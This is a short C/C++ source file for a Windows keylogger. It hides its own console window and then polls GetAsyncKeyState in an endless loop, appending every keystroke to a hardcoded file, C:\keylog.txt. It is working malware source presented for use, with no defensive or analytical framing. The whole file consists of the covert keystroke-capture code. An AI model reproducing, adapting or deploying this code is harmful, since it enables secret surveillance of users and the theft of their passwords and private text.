/*
Title: Keylogger
*/
#include <Windows.h>
#include <stdio.h>

VOID LogKey(int key, const char* filePath) {
	FILE* pFile;
	errno_t err = fopen_s(&pFile, filePath, "a+");
	if (err != 0) {
		char errorMessage[256];
		strerror_s(errorMessage, sizeof(errorMessage), err);
		printf("Error opening file: %s\n", errorMessage);
		return;
	}

	switch (key) {
	case VK_LBUTTON:
		fprintf(pFile, "[LBUTTON]");
		break;
	case VK_RBUTTON:
		fprintf(pFile, "[RBUTTON]");
		break;
	case VK_CANCEL:
		fprintf(pFile, "[CANCEL]");
		break;
	case VK_MBUTTON:
		fprintf(pFile, "[MBUTTON]");
		break;
	case VK_BACK:
		fprintf(pFile, "\b");
		break;
	case VK_TAB:
		fprintf(pFile, "\t");
		break;
	case VK_CLEAR:
		fprintf(pFile, "[CLEAR]");
		break;
	case VK_RETURN:
		fprintf(pFile, "\n");
		break;
	case VK_CONTROL:
		fprintf(pFile, "[CTRL]");
		break;
	case VK_MENU:
		fprintf(pFile, "[ALT]");
		break;
	case VK_ESCAPE:
		fprintf(pFile, "[ESC]");
		break;
	case VK_SPACE:
		fprintf(pFile, " ");
		break;
	case VK_END:
		fprintf(pFile, "[END]");
		break;
	case VK_HOME:
		fprintf(pFile, "[HOME]");
		break;
	case VK_LEFT:
		fprintf(pFile, "[LEFT]");
		break;
	case VK_UP:
		fprintf(pFile, "[UP]");
		break;
	case VK_RIGHT:
		fprintf(pFile, "[RIGHT]");
		break;
	case VK_DOWN:
		fprintf(pFile, "[DOWN]");
		break;
	case VK_PRINT:
		fprintf(pFile, "[PRINT]");
		break;
	case VK_SNAPSHOT:
		fprintf(pFile, "[PRINT_SCREEN]");
		break;
	case VK_INSERT:
		fprintf(pFile, "[INS]");
		break;
	case VK_DELETE:
		fprintf(pFile, "[DEL]");
		break;
	case VK_HELP:
		fprintf(pFile, "[HELP]");
		break;
	case VK_LWIN:
		fprintf(pFile, "[LWIN]");
		break;
	case VK_RWIN:
		fprintf(pFile, "[RWIN]");
		break;
	case VK_APPS:
		fprintf(pFile, "[APPS]");
		break;
	case VK_MULTIPLY:
		fprintf(pFile, "*");
		break;
	case VK_ADD:
		fprintf(pFile, "+");
		break;
	case VK_SUBTRACT:
		fprintf(pFile, "-");
		break;
	case VK_DIVIDE:
		fprintf(pFile, "/");
		break;
	case VK_LSHIFT:
		fprintf(pFile, "[LSHIFT]");
		break;
	case VK_RSHIFT:
		fprintf(pFile, "[RSHIFT]");
		break;
	case VK_LCONTROL:
		fprintf(pFile, "[LCTRL]");
		break;
	case VK_RCONTROL:
		fprintf(pFile, "[RCTRL]");
		break;
	case VK_LMENU:
		fprintf(pFile, "[LMENU]");
		break;
	case VK_RMENU:
		fprintf(pFile, "[RMENU]");
		break;
	case VK_OEM_PLUS:
		fprintf(pFile, "+");
		break;
	case VK_OEM_COMMA:
		fprintf(pFile, ",");
		break;
	case VK_OEM_MINUS:
		fprintf(pFile, "-");
		break;
	case VK_OEM_PERIOD:
		fprintf(pFile, ".");
		break;
	default:
		fprintf(pFile, "%c", static_cast<char>(key));
		break;
	}

	fclose(pFile);
}

BOOL Keylogger() {
	const char* filePath = "C:\\keylog.txt"; // Replace it

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	while (TRUE) {
		Sleep(10);
		for (int i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				LogKey(i, filePath);
			}
		}
	}

	return TRUE;
}
